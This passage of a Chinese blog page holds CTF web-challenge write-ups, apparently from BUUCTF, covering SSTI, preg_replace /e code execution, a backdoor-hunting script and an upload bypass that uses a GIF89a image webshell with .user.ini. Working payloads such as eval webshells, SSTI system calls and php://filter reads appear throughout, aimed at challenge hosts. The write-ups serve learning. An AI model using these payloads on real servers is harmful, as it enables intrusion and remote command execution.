+<p>进去的页面很好看。有个flag的页面当然要点进去看看<br><img src="https://i.loli.net/2020/03/10/b7xzufVt2Ll8OrS.png" alt="Snipaste_2020-03-10_08-55-25.png"><br>看到了一个回显的ip。应该是我的网络出口ip了。(因为我家是不是公网ip所以不打码也没关系)<br><img src="https://i.loli.net/2020/03/10/yIZqoRd4Awahzkg.png" alt="Snipaste_2020-03-10_09-06-02.png"><br>看到这个页面感觉有那么点思路了。估计是通过x-forwarded-for这种header头做点事。<br>还有个hint，点过去看看，不过其实里面没什么。看了下源码，有一句注释，应该算是提示了吧。<br><img src="https://i.loli.net/2020/03/10/IKQa9DPx8YgzFWZ.png" alt="Snipaste_2020-03-10_09-09-21.png"><br>应该还是提醒一下做题人要注意后端代码逻辑。</p>
+<hr>
+<p>既然刚才看到了回显的ip。也有从x-forwarded-for这样的header头做事的想法就先试试吧。<br>先检查一下有没有注入。<br>抓包分别加入以下header头测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x-forwarded-for:123.123.112.113&apos; or &apos;1&apos;=&apos;1</span><br><span class="line">x-forwarded-for:123.123.112.113&apos; and &apos;1&apos;=&apos;2</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/03/10/Pv6Nx3DXuIG9oad.png" alt="Snipaste_2020-03-10_09-16-40.png"><br><img src="https://i.loli.net/2020/03/10/lsRydFoJSVzx8PI.png" alt="Snipaste_2020-03-10_09-16-38.png"><br>好像没有注入。试试命令执行有没有：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x-forwarded-for: 172.36.2.3;|ls /|</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/03/10/s5TrQOI7JVS2dxi.png" alt="Snipaste_2020-03-10_09-19-15.png"><br>好像也没有命令注入。<br><strong>但是看到这种把你的输入都回显在输出上的行为你想到什么了？</strong><br>好吧我第一反应是xss。<br>那就试试看xss</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x-forwarded-for: 122.44.32.6&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/03/10/rHkQMyKfiaJeI5E.png" alt="Snipaste_2020-03-10_09-22-08.png"><br>确实有xss，不过只是selfxss。没啥用。</p>
+<hr>
+<p>既然又不是sql注入也不是xss什么的，我就不知道怎么做了。看了大佬的wp才知道是SSTI。<br>关于这个知识点我之前是没有遇到过的。这里会出问题是因为把用户输入当作模板变量来解析了。<br>这里顺便贴一张fuzz模板的图吧。<br><img src="https://i.loli.net/2020/03/11/SZHzcyRDl2Fxdte.png" alt="Snipaste_2020-03-11_08-27-32.png"><br>如果知道ssti这个知识点的话随便测试一下就知道这个点有没有问题了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;2-1&#125;</span><br><span class="line">&#123;&#123;2-1&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>如果第一第二个测试都回显1那就是smarty模板，<br>如果只有第二个可以执行那就是twig模板<br>知道了{}包裹的变量会被模板解析之后就好做了<br>查看目录文件，读取flag就行了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;system(&apos;ls /&apos;)&#125;</span><br><span class="line">&#123;system(&apos;cat /flag)&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="总结-11"><a href="#总结-11" class="headerlink" title="总结"></a>总结</h3><p>这道题是全新的知识点，第一次碰到，做不出来也是情有可原。<br>看了一圈网上的wp，好像没有几个讲得比较详细的。可能大家都觉得这个东西没什么<br>仔细研究的必要吧(苦了我这种新手了)。<br>做这道题的收获应该是开阔了视野吧，知道了ssti这回事。以后遇到类似的题型至少多了一种解题思路。</p>
+<h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><p>知识点：</p>
+<ul>
+<li>data伪协议和file_get_contents的应用。</li>
+<li>php://input和file_get_contents的应用</li>
+<li>preg_replace在e模式下的代码执行行为</li>
+</ul>
+<hr>
+<p>这道题算是代码审计了吧。一进去挺直白的，给你看了代码<br><img src="https://i.loli.net/2020/03/11/O5TpvY2PKnwgRLV.png" alt="Snipaste_2020-03-11_19-44-25.png"><br>看意思应该是要我们想办法看看next.php的内容。这个可以用php://filter来看。<br>在那之前要先想办法走到文件包含的那一步。主要是怎么样绕过<br>(file_get_contents($text,’r’)===”I have a dream”)<br>这一句。<br>网上查查到一种。看大佬的wp知道另一种。分别写一下</p>
+<ul>
+<li>data伪协议</li>
+<li>php://input<br>使用data伪协议的话是直接读后面的内容进来。payload如下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain,I have a dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span><br></pre></td></tr></table></figure>
+也可以使用php://input协议来获取数据。要注意的是使用php:input获取的数据不能是form-data和x-www-form-urlencoded的。<br>payload的如下(采用post方式)<br><img src="https://i.loli.net/2020/03/11/I8oqN2DOySKciQT.png" alt="Snipaste_2020-03-11_19-56-42.png"></li>
+</ul>
+<hr>
+<p>这样就得到了base64格式的源码。解码一下。代码内容如下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id = $_GET[&apos;id&apos;];</span><br><span class="line">$_SESSION[&apos;id&apos;] = $id;</span><br><span class="line"></span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line">    return preg_replace(</span><br><span class="line">        &apos;/(&apos; . $re . &apos;)/ei&apos;,</span><br><span class="line">        &apos;strtolower(&quot;\\1&quot;)&apos;,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foreach($_GET as $re =&gt; $str) &#123;</span><br><span class="line">    echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getFlag()&#123;</span><br><span class="line">	@eval($_GET[&apos;cmd&apos;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>粗略看了一下。发现个@eval(注意这里@使得不会报错。)<br>第一时间是想着想办法执行这个getFlag函数来达到目的。<br>看看代码发现preg_replace函数的正则使用了e这个没有见过的模式。<br>搜一下看看是个什么意思。<br><img src="https://i.loli.net/2020/03/11/nPYxw2iu6ZtGQEs.png" alt="Snipaste_2020-03-11_20-11-24.png"><br><img src="https://i.loli.net/2020/03/11/QRDXSvAEhJWGuYf.png" alt="Snipaste_2020-03-11_20-03-38.png"><br>看来是个很危险的模式，考点应该就是这里了。不过那个例子我是没看懂，那就继续搜<br>搜来搜去搜到原题了。<a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">传送门</a><br>这篇文章真是非常棒了，至少让我知道这是咋运行的了。</p>
+<hr>
+<p>虽然文章里面有了很详细的叙述，但是这里还是把自己的理解记录一下，就当加深记忆了。<br>首先这里需要明白一个反向引用的概念。我的理解的话这里和python的分组有点类似。<br>把pattern里带()的部分作为一组。如果subject里有被匹配到就从1开始计算。<br>不过这里的反向引用会把匹配到的部分带入到replacement里。而且由于使用了e这个模式修饰符，<br>反向引用(代入匹配部��)后会把replacement放到eval中执行一下。<br>看e模式修饰符也有说，在代替之前会把匹配到的部分放到addslashes里运行一下。<br>知道了如果有被匹配到的部分，完成反向引用后会被eval执行这一点。就得想办法让构造payload让正则匹配到。<br>这部分在那一篇参考文章里讲得很详细了，不能传非法参数名.，会被自动替换为_。所以使用了如下payload<br><strong>对了。这个payload是在next.php这个页面用的</strong>，由于直接可以包含到这个文件所以可以判断这个next.php和index.php是在一个目录下的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?\S*=$&#123;code&#125;</span><br></pre></td></tr></table></figure>
+<p>\S表示匹配非空字符嘛。既然如此就不能直接用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?\S*=$&#123;system(&apos;ls /&apos;)&#125;</span><br></pre></td></tr></table></figure>
+<p>之类的payload了，因为有空格，会匹配不完全报错。<br>所以这里还是得绕一下路，构造如下payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?\S*=$&#123;eval($_GET[irrik])&#125;&amp;irrik=system(&apos;ls /&apos;);</span><br><span class="line">?\S*=$&#123;eval($_GET[irrik])&#125;&amp;irrik=system(&apos;cat /flag&apos;);</span><br></pre></td></tr></table></figure>
+<p>当然你也可以用蚁剑连接一下。用POST的方式写马也是行的。不过这里还是get方便点所以就这么写了。<br>话说回来，用getFlag函数来执行命令也是可以的<br>对了。这里的$_GET里面不能带’,”这种。因为在替换前会把匹配到的部分放到assslashes运行一下。感觉应该是这里的问题，加了引号会报错。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&apos;ls /&apos;);</span><br><span class="line">?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&apos;cat /flag&apos;);</span><br></pre></td></tr></table></figure>
+<p><strong>要注意的是，往eval里执行的语句比如system(‘xx’)后面要记得加分号。</strong></p>
+<h3 id="总结-12"><a href="#总结-12" class="headerlink" title="总结"></a>总结</h3><p>这道题学到挺多的。有伪协议的使用。${}解析变量。还要preg_replace的e模式下代码执行。<br>对代码执行更加熟悉了。比如要在””双引号下才能解析变量。${}花括号里面才会被作为变量解析。<br>如果把payload ?\S*=${getFlag()}&amp;cmd=system(‘cat /flag’);的$去掉的话就不会成功执行了。<br>因为没有把getFlag()当作变量解析(运行)。</p>
+<ul>
+<li>php://input php://filter data:</li>
+<li>preg_replace 非法参数名里.号的自动替换(_) e模式下eval的代码执行。</li>
+<li>${}的变量解析。系统代码后面记得带分号等等。<br>学到好多，谢谢招待。<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2>知识点</li>
+<li>SSTI</li>
+</ul>
+<hr>
+<p>其实做完了那道BJD的ssti题目再看这个就很有感觉了。<br>题目名字就给你说了tornado这个框架，点击去看看有啥。<br>一个四个页面，url和内容分别如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http://31f0233d-f904-4207-9b61-185cd477df9a.node3.buuoj.cn/file?filename=/flag.txt&amp;filehash=c9420bc3136b5fce51f98607229c8724</span><br><span class="line">/flag.txt</span><br><span class="line">flag in /fllllllllllllag</span><br><span class="line"></span><br><span class="line">http://31f0233d-f904-4207-9b61-185cd477df9a.node3.buuoj.cn/file?filename=/welcome.txt&amp;filehash=ee4c90aae91bf3f8d956113d34e09001</span><br><span class="line">/welcome.txt</span><br><span class="line">render</span><br><span class="line"></span><br><span class="line">http://31f0233d-f904-4207-9b61-185cd477df9a.node3.buuoj.cn/file?filename=/hints.txt&amp;filehash=d79977c0da2e5b2a7dda9946c4bcf927</span><br><span class="line">/hints.txt</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure>
+<p>告诉了我们flag在哪，访问方法也讲了给了，就是filename=xx+filehash=xx<br>而且也给了这个文件的hash的组成方法。那剩下的应该就是想办法拿到这个cookie_secret了。<br>还有个文件提到了render。先查查看都是些什么吧。</p>
+<hr>
+<p>先看看render<br><img src="https://i.loli.net/2020/03/12/Qvs4HB8dNtnTJiS.png" alt="Snipaste_2020-03-12_15-38-47.png"><br><img src="https://i.loli.net/2020/03/12/uDQE8CPsx3XzrVi.png" alt="Snipaste_2020-03-12_13-55-51.png"><br><a href="https://www.jianshu.com/p/63c27a71a337" target="_blank" rel="noopener">传送门</a><br><a href="https://zhuanlan.zhihu.com/p/25735394" target="_blank" rel="noopener">传送门</a><br>再结合一些别的资料，render应该是一个模板函数，根据访问参数不同返回不同的网页。<br>本题这里应该就是msg参数被传到了render里面。可以用的办法来进行注入<br>再看看cookie_secret<a href="https://tornado-zh.readthedocs.io/zh/latest/guide/security.html" target="_blank" rel="noopener">传送门</a><br>参照官方说法应该是一个密钥</p>
+<hr>
+<p>继续做题，先直接尝试访问flag的文件试试<br><img src="https://i.loli.net/2020/03/12/7LboRWpBfZNtMkE.png" alt="Snipaste_2020-03-12_14-22-41.png"><br>发现报错了。而且错误信息在msg参数里。感觉应该是ssti.改动一下试试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">123   // 123</span><br><span class="line">&#123;&#123;123&#125;&#125; // 123 这个显示123基本可以确定存在注入了</span><br><span class="line">&#123;&#123;123-1&#125;&#125; // ORZ 应该是过滤了什么东西</span><br></pre></td></tr></table></figure>
+<p>知道了注入点还要知道怎么注入。刚才的几个链接里有看到把cookie_secret写在名为settings的字典里。<br>直接试了不行。知识盲区没得办法最后还是去看了别人的wp。<br>别人的payload是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>看了wp大概意思是环境变量都放在settings这里是没错，但是还要加上个handler<br>关于handler的一点信息<a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="noopener">传送门</a></p>
+<blockquote>
+<p>在Tornado的前端页面模板中，Tornado提供了一些对象别名来快速访问对象<br>handler 指向RequestHandler<br>而RequestHandler.settings又指向self.application.settings<br>所以handler.settings就指向RequestHandler.application.settings了！</p>
+</blockquote>
+<p>拿到了cookie_secret之后根据前面提示的规则找个在线网站运行一下访问就能拿到flag了</p>
+<h3 id="总结-13"><a href="#总结-13" class="headerlink" title="总结"></a>总结</h3><p>这里好不甘心，找到了注入点但是就是拿不到自己想要的数据(其实是不知道怎么拿)。<br>这题其实有点考察代码功底的意思了吧。代码写得少(我这种)的话都不知道怎么注才能达到目的。<br>还是代码写太少了。多写点代码吧。这里比较重要的点应该就是考察了tornado的快速访问对象这个点。<br>要知道handler.settings最终指向RequestHandler.application.settings才能得到cookie_secret</p>
+<h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>知识点</p>
+<ul>
+<li>脚本编写能力<br>这道题进去就直接告诉你源码在哪了。把源码下载下来解压一下发现src文件夹里有3000个php文件。<br>随便点开一个看看发现好像有后门。不过其实大都被置空了。<br>其实看到这里的时候我是懵的，没见过这种题型，后来又去看了大佬的wp就知道大概是要写脚本了。</li>
+</ul>
+<hr>
+<p>脚本无非就是找出$_GET或者$_POST隐藏的真正一句话在哪。这里有三千多个文件。每个文件里有几十个GET或者POST的语句。<br>这里的思路是写脚本一个一个尝试，直到发现真正的后门。可以在本地搭建环境然后自己测试。<br>这个环境搭建真是一把心酸一把泪。遇到了个玄学问题，浏览器能访问但是python的requests不能访问。<br>在这里较劲花了很长时间最后妥协了重装环境就好了。<br>最终编写了如下脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">from concurrent.futures import ThreadPoolExecutor, as_completed</span><br><span class="line">import os</span><br><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line">import traceback</span><br><span class="line">from collections import deque</span><br><span class="line"></span><br><span class="line">def req_url(filename, re_com):</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    请求url并返回结果</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    commadn = &apos;echo &quot;irrik&quot;&apos;</span><br><span class="line">    print(&apos;try:&apos;,filename)</span><br><span class="line">    # print(f&apos;http://localhost/src/&#123;filename&#125;&apos;)</span><br><span class="line">    with open(r&apos;D:\phpstudy_pro\WWW\src/&apos; + filename) as f:</span><br><span class="line">        data = f.read()</span><br><span class="line">        #print(data)</span><br><span class="line">    param_list = list(set(re_com.findall(data)))</span><br><span class="line">    for param in param_list:</span><br><span class="line">        try:</span><br><span class="line">            if param[0] == &apos;GET&apos;:</span><br><span class="line">                res = requests.get(f&apos;http://localhost/src/&#123;filename&#125;?&#123;param[1]&#125;=&#123;commadn&#125;&apos;, timeout=1)</span><br><span class="line">                # print(f&apos;http://localhost/src/&#123;filename&#125;?&#123;param[1]&#125;=&#123;commadn&#125;&apos;)</span><br><span class="line">            else:</span><br><span class="line">                res = requests.post(f&apos;http://localhost/src/&#123;filename&#125;&apos;,data=&#123;param[1]: &quot;echo &apos;irrik&apos;&quot;&#125;, timeout=1)</span><br><span class="line">                # print(f&apos;http://localhost/src/&#123;filename&#125;&apos;)</span><br><span class="line">            if res.text.find(&apos;irrik&apos;) != -1:</span><br><span class="line">                print(&apos;find shell!&apos;,filename,param)</span><br><span class="line">                sys.exit()</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    主函数</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    re_com = re.compile(r&apos;\$_([POSTGE]&#123;3,4&#125;)\[\&apos;(.*?)\&apos;\]&apos;)</span><br><span class="line">    file_list = os.listdir(r&apos;D:\phpstudy_pro\WWW\src&apos;)</span><br><span class="line">    with ThreadPoolExecutor(max_workers=8) as t:</span><br><span class="line">        obj_list = []</span><br><span class="line">        for filename in file_list:</span><br><span class="line">            obj = t.submit(req_url, filename,re_com)</span><br><span class="line">            obj_list.append(obj)</span><br><span class="line">        # for future in as_completed(obj_list):</span><br><span class="line">        #     data = future.result()</span><br><span class="line">        #     print(f&quot;main: &#123;data&#125;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>跑了个一个半小时。<br>最后找到真后门如下:<br><img src="https://i.loli.net/2020/03/14/Qrq7k3uE2jJaCYM.png" alt="Snipaste_2020-03-14_00-59-44.png"><br>直接在服务器上连，然后执行命令就行。<br>这里值得说的是一开始我没有去看文件里后门的格式，用了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&apos;ls /&apos;)</span><br></pre></td></tr></table></figure>
+<p>没反应。后来看了后门的格式就直接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /</span><br><span class="line">cat /flag</span><br></pre></td></tr></table></figure>
+<p>就完事了。</p>
+<h3 id="总结-14"><a href="#总结-14" class="headerlink" title="总结"></a>总结</h3><p>这里有点考思路和代码功底。首先要能想到黑客可能留了后门。<br>还有就是要能写出高效的脚本。不然要跑蛮久的。</p>
+<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>知识点</p>
+<ul>
+<li>content-type绕过</li>
+<li>图片头检测绕过(GIF89a)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;执行php代码</span><br></pre></td></tr></table></figure></li>
+<li>.user.ini 修改设置包含图片马</li>
+</ul>
+<hr>
+<p>进去是一个上传页面。不难猜出是上传的webshell。<br>随便试了一下，发现了几个不允许的点：</p>
+<ul>
+<li>不能含有&lt;?</li>
+<li>必须是图片内容开头(用最简单的GIF89a绕过)</li>
+<li>conten-type必须是图片格式。</li>
+<li>后缀不能是php，php5，pht等<br>这样的话可以上传一个图片马命名为irrik.jpg，内容如下,<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_GET[&apos;irrik&apos;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<hr>
+<p>到这里我就不会了哈哈哈。不会就去看大佬们怎么写的，果然直接上传一个图片马还不行，<br>要想办法让服务器把图片当成php来解析。<br>这里一般的做法是想办法传一个.htaccess，不过.htaccess是针对apache的<br>这道题的服务器是nginx的，那.htaccess就行不通了。这里大佬们提到了可以用.user.ini来将图片马成功解析<br>先看看.user.ini文件是干嘛的<br><img src="https://i.loli.net/2020/03/14/IQYCAJ4PkVhsvbB.png" alt="Snipaste_2020-03-14_09-16-37.png"><br>大致是说除了主要的php.ini设置以外,php还会在<strong>每个</strong>目录下扫描INI文件，从被执行的php文件目录开始<br>一直扫到web根目录。<strong>这就要求.user.ini所在的目录要有一个php文件才行，不然设置了没有php文件是没用的，因为没有被扫描到也就无效了</strong><br>.user.ini可以设置PHP_INI_PREDIR和PHP_INI_USER模式下的设置(设置其他模式的配置不被识别)<br>在可以设置的范围内有两个设置比较有用，<br><img src="https://i.loli.net/2020/03/14/JWBTjUHwpb83Igq.png" alt="Snipaste_2020-03-14_09-26-17.png"></p>
+<ul>
+<li>auto_append_file<br>_ auto_prepend_file<br>这两个设置的作用大概相当于include()函数。只不过一个是在文件后添加，一个是在文件开头添加。<br>例如本题我们传了一个irrik.jpg.<br>可以在user.ini中作如下设置:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=irrik.jpg</span><br></pre></td></tr></table></figure>
+这样一来，在我们访问.user.ini所在的目录下的php文件时，会在php文件里包含irrik.jpg的内容。<br>这样一来里面的一句话木马就可以被解析成功了。</li>
+</ul>
+<hr>
+<p>最后构造如下payload<br>irrik.jpg</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_GET[&apos;irrik&apos;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>.user.ini</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=irrik.jpg</span><br></pre></td></tr></table></figure>
+<p>这里主要不要在.user.ini这加前缀，会识别不了。<br>上传之后直接访问文件所在目录，这里要注意，所在目录下是有一个index.php文件的。这也是本题成功的关键所在。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://7a371656-c56e-4c9a-a58c-e8018cd39072.node3.buuoj.cn/uploads/76d9f00467e5ee6abc3ca60892ef304e/?irrik=system(&apos;ls /&apos;);</span><br><span class="line">http://7a371656-c56e-4c9a-a58c-e8018cd39072.node3.buuoj.cn/uploads/76d9f00467e5ee6abc3ca60892ef304e/?irrik=system(&apos;cat /flag&apos;);</span><br></pre></td></tr></table></figure>
+<p>拿到flag。<br>这里转一下大佬关于.ini.user的总结<a href="https://xz.aliyun.com/t/6091" target="_blank" rel="noopener">传送门</a><br><img src="https://i.loli.net/2020/03/14/l8we9T6QDWF1Ntj.png" alt="Snipaste_2020-03-14_09-40-05.png"></p>
+<hr>
+<p>既然无意间看到了.htaccess，顺便去查一下这个文件吧,就像前面说的，这个文件是apache的配置指令文件。<br>.htaccess文件<strong>作用于所在目录及其所有子目录</strong>。<br>引用一下这位大佬的文章<a href="https://skysec.top/2017/09/06/%E6%9C%89%E8%B6%A3%E7%9A%84-htaccess/" target="_blank" rel="noopener">传送门</a><br>可以看到.htaccess也是用处非常多的。以后应该不会少打交道。</p>
+<h3 id="总结-15"><a href="#总结-15" class="headerlink" title="总结"></a>总结</h3><p>本题考察的几个点有些有印象有些是新的。<br>比如GIF89a碰到过，mime头绕过碰到过。.user.ini是新知识。.htaccess也是没碰到过。<br>还是有学到新知识的。谢谢招待。</p>
+<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>知识点</p>
+<ul>
+<li>js跳转</li>
+<li>php://filter读源码<br>这道题其实蛮简单的，适合我这样的新手(2333)<br>第一个进去的页面是一个黑底页面，题目既然叫secret file估计也就是叫我们找到文件所在。<br>没头绪的时候就先看看源码。诶，发现了一个href.点一下<br><img src="https://i.loli.net/2020/03/14/mCYXPTLG9I1oqOd.png" alt="Snipaste_2020-03-14_11-46-28.png"><br>进去到另一个页面。这里说把所有秘密都放在这里了<br><img src="https://i.loli.net/2020/03/14/y6VA8GgfCs2rNhp.png" alt="Snipaste_2020-03-14_11-47-44.png"><br>点了之后却没有发现什么，还说没看清就回去再看看<br><img src="https://i.loli.net/2020/03/14/2zFQfuYrC1A3q95.png" alt="Snipaste_2020-03-14_11-47-47.png"><br>这里想到可能是js跳转了，抓包一看果然。提示了一个secr3t.php<br>那就访问一下：<br><img src="https://i.loli.net/2020/03/14/DdWoBiyAa2JIf6x.png" alt="Snipaste_2020-03-14_11-49-34.png"><br>一看好像有过滤条件，但是貌似直接包含flag.php并不会触发，直接包含一下看看:<br>果然成功了<br><img src="https://i.loli.net/2020/03/14/1TdfkR4M83OiVDX.png" alt="Snipaste_2020-03-14_11-51-10.png"><br>不过并没有看到flag。看了源码，响应头都没有。估计是在php文件里没回显出来<br>用php://filter访问一下输出流<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+果然得到了编码后的源码。解密一下得到源码。<h3 id="总结-16"><a href="#总结-16" class="headerlink" title="总结"></a>总结</h3>考点比较简单。应该是php://filter读源码还有一个js跳转。<h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2>知识点：</li>
+<li>反序列化</li>
+<li>__wakeup函数的绕过<br>__wakeup漏洞影响版本：<br>php5 &lt; 5.6.25<br>php7 &lt; 7.0.10<br>这道题进去提示了自己经常备份源码。那应该就是源码泄露了。因为扫后台的时候请求好像太多出了点问题，<br>所以直接去找了题目核心源码来看。看起来有点新知识，所以复现了一下并总结一下知识。<br>核心代码如下:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 